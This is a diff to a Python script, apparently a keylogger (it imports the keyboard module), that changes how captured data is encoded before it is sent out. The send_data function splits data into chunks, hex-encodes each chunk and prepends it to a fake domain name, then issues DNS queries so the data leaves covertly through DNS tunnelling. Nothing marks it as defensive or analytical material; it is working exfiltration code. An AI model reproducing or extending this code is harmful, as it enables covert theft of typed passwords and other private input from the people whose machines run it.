@@ -3,7 +3,6 @@
 ###############################################################
 import os
 import time
-import idna
 import socket
 import threading
 import keyboard
@@ -43,9 +42,10 @@ def send_data(data):
 
     while len(parts) > 0:
         # Cria o payload com o nome de domínio fictício
-        part = parts.pop(0)
-        part = idna.encode(part).encode('ascii')
-        request = str(part) + str(_FAKE_DOMAIN)
+        payload = parts.pop(0)
+        payload = ''.join([hex(ord(c)) for c in payload])
+        payload = payload.replace('0x', '')
+        request = str(payload) + str(_FAKE_DOMAIN)
         
         # Cria a requisição DNS
         domain = DNSRecord.question(request)
